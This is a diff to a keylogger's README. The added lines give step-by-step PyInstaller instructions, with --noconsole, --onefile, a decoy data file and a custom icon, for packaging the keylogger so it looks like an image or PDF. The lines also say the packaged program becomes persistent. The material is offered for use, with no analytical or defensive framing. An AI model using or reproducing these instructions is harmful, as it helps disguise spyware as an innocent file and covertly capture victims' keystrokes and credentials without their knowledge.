@@ -5,4 +5,11 @@ How to use: <br /><br />
 So to use this as python file its all ready but to package it into image or anything you have to use 'pyinstaller' script which you can download via pip. <br />
 And at this time I am using pyinstaller==3.5 (version) that is running errorless for me. <br />
 To package this into image/pdf/anything you have to first edit the 'Keylogger.py' file and erase the '#' in line 25   i.e. '#self.check_file()' --> 'self.check_file()' <br />
-For more info on pyinstaller visit 'https://pyinstaller.readthedocs.io/en/stable/usage.html'<br />
+For more info on pyinstaller visit 'https://pyinstaller.readthedocs.io/en/stable/usage.html'.
+After Packaging it will become persistant too.<br />
+The command of pyinstaller require to use for this file is as:<br />
+'C:/Python27/Scripts/pyinstaller.exe --add-data "@'location of file'@;." --icon "@'location of icon'@" --onefile --noconsole keylogger.py'<br />
+__Ignore the @. these are just to distinguish__<br />
+'location of file' = location of file you want that to turn with extension.<br />
+'location of icon' = location of icon you want to add to file with '.ico' extension.<br />
+And in line 41 you have to add the name of file you added in pyinstaller. Eg:- 'image.jpg' or 'example.pdf' or anything like that
